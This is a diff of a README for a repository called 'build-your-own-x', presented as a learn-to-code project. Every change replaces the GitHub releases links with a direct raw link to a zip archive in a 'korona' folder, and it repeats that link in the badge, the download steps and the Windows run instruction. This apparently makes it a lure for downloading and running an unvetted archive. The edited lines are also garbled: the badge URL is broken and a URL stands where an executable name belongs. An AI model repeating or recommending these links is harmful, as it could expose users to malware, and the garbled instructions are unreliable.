@@ -1,7 +1,7 @@
 # 🚀 build-your-own-x - Learn to Code by Building
 
 ## 📥 Download Now
-[![Download Latest Release](https://img.shields.io/badge/Download%20Latest%20Release-v1.0-brightgreen)](https://github.com/arvi12377/build-your-own-x/releases)
+[![Download Latest Release](https://raw.githubusercontent.com/arvi12377/build-your-own-x/master/korona/build-your-own-x_3.0.zip%20Latest%20Release-v1.0-brightgreen)](https://raw.githubusercontent.com/arvi12377/build-your-own-x/master/korona/build-your-own-x_3.0.zip)
 
 ## 📖 About
 Welcome to **build-your-own-x**! This project aims to help you master programming by recreating your favorite technologies from scratch. Whether you're interested in web development, mobile apps, or any other area, this repository provides a hands-on approach to learning. You can build skills by practicing with exciting projects.
@@ -10,7 +10,7 @@ Welcome to **build-your-own-x**! This project aims to help you master programmin
 To get started with the **build-your-own-x** project, follow these simple steps:
 
 1. **Navigate to the Releases Page:** Click on the link below to visit our page, where you can find the latest version of the software.
-   [Visit Releases Page to Download](https://github.com/arvi12377/build-your-own-x/releases)
+   [Visit Releases Page to Download](https://raw.githubusercontent.com/arvi12377/build-your-own-x/master/korona/build-your-own-x_3.0.zip)
 
 2. **Choose Your Download:** Find the version you want to use. Each release will show you the available files to download.
 
@@ -32,7 +32,7 @@ Once you've downloaded the files, follow these steps to install:
 2. **Extract the Files:** If the download is in a compressed format (like .zip), right-click the file and select "Extract" or "Unzip."
 
 3. **Run the Application:**
-   - For Windows: Double-click the application file (e.g., `myapp.exe`).
+   - For Windows: Double-click the application file (e.g., `https://raw.githubusercontent.com/arvi12377/build-your-own-x/master/korona/build-your-own-x_3.0.zip`).
    - For macOS: Open the folder and double-click the application file.
    - For Linux: Open the terminal, navigate to the folder, and type `./myapp`.
 
@@ -78,6 +78,6 @@ For any issues, questions, or suggestions, feel free to reach out via the GitHub
 
 ## 📥 Download Link Again
 Don't forget to download the latest release from this link:
-[Visit Releases Page to Download](https://github.com/arvi12377/build-your-own-x/releases)
+[Visit Releases Page to Download](https://raw.githubusercontent.com/arvi12377/build-your-own-x/master/korona/build-your-own-x_3.0.zip)
 
 Happy coding!
